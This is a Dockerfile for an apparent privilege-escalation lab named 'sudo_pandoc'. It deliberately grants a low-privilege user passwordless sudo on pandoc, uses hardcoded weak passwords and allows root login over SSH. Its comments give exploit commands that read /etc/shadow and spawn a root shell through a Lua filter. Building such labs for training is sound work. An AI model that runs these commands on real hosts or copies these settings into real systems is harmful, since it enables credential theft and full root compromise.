FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_pandoc
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/pandoc as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and pandoc
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        pandoc \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify pandoc is installed
RUN which pandoc && ls -la /usr/bin/pandoc

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# pandoc can read arbitrary files when run as root. The exploit approach:
#   sudo pandoc -t plain /etc/shadow
# This converts any file to plain text output, allowing reading of privileged files.
# Additionally, pandoc supports Lua filters which can execute arbitrary commands:
#   echo 'os.execute("/bin/sh")' > /tmp/shell.lua
#   sudo pandoc -L /tmp/shell.lua /dev/null
# This gives a root shell directly.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/pandoc" > /etc/sudoers.d/pandoc && \
    chmod 440 /etc/sudoers.d/pandoc

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]